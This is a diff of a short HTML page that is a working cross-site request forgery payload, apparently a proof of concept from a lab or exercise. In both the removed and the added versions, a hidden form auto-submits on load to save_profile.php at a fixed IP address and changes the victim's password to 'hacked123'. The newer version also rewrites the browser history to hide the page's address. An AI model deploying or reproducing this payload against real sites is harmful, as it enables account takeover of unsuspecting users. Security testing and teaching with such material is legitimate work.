@@ -1,13 +1,13 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <title>Fake Form</title>
-  </head>
-  <body onload="document.fake_form.submit()">
-    <form action="http://34.126.103.102/save_profile.php" method="POST" name="fake_form" style="display: none;" target="hidden_results">
-      <input type="text" name="password" value="hacked123" />
-      <input type="text" name="cpassword" value="hacked123" />
-    </form>
-    <iframe name="hidden_results" style="display: none;"></iframe>
-  </body>
+ <body>
+ <script>history.pushState('', '', '/')</script>
+   <form action="http://34.126.103.102/save_profile.php" method="POST">
+     <input type="hidden" name="password" value="hacked123" />
+     <input type="hidden" name="cpassword" value="hacked123" />
+     <input type="submit" value="Submit request" />
+   </form>
+   <script>
+     document.forms[0].submit();
+   </script>
+ </body>
 </html>
